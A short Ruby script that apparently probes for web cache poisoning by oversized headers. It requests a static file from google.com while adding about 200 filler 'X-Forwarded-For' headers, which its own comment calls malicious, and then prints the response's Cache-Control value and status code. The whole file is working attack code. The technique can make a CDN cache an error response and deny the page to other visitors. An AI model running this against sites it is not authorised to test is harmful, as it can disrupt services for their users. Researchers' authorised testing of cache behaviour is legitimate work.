require 'net/http'
uri = URI("https://google.com/file.js")
#uri = URI("https://google.com/file.css") # or use key or any ext 
req = Net::HTTP::Get.new(uri)
req["Accept-Encoding"] = "gzip,deflate,br"
num = 200
i = 0

oversize = "A"*100

# Setting malicious and irrelevant headers fields for creating an oversized header
until i > num  do
        req["X-Forwarded-For#{i}"] = "#{oversize}"
        i +=1;
end

res = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => uri.scheme == 'https') {|http|
        http.request(req)
}

cacheStatus = res["Cache-Control"]

code = res.code.to_i

puts "Cache-Control: #{cacheStatus}"
puts "#{code}"
